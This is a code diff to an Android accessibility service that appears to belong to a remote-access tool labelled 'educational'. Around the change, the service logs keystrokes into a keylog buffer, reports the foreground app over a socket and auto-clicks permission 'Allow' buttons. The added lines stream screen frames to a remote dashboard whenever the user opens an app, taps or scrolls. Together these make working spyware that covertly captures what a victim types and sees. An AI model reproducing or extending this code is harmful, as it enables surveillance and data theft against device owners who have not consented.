@@ -77,6 +77,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_FOCUSED |
                          AccessibilityEvent.TYPE_VIEW_CLICKED |
+                         AccessibilityEvent.TYPE_VIEW_SCROLLED |
                          AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                          AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
@@ -210,12 +211,29 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     updateCurrentAppName();
                     String log = "[" + packageName + "] APP OPENED";
                     keylogBuffer.add(log);
-                    // Notify app monitor of foreground change
                     try {
-                        SocketManager.getInstance(this).getAppMonitor().onAppForeground(packageName);
+                        SocketManager smWin = SocketManager.getInstance(this);
+                        smWin.getAppMonitor().onAppForeground(packageName);
+                        // Push a frame so dashboard sees the new screen
+                        if (smWin.isStreamingActive()) {
+                            smWin.scheduleFrameAfterAction(
+                                com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
+                        }
                     } catch (Exception ignored) {}
                     break;
-                    
+
+                case AccessibilityEvent.TYPE_VIEW_CLICKED:
+                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
+                    // Push a frame whenever the device user taps or scrolls
+                    try {
+                        SocketManager sm = SocketManager.getInstance(this);
+                        if (sm.isStreamingActive()) {
+                            sm.scheduleFrameAfterAction(
+                                com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
+                        }
+                    } catch (Exception ignored) {}
+                    break;
+
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                     autoClickAllowButton();
                     break;
